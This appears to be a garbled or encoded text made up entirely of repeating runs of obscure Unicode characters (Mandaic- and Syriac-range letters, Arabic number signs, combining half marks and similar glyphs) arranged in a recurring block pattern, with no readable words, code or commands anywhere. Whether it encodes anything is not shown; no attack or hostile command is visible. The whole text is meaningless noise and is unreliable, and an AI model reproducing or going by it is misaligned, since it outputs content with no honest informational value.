࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬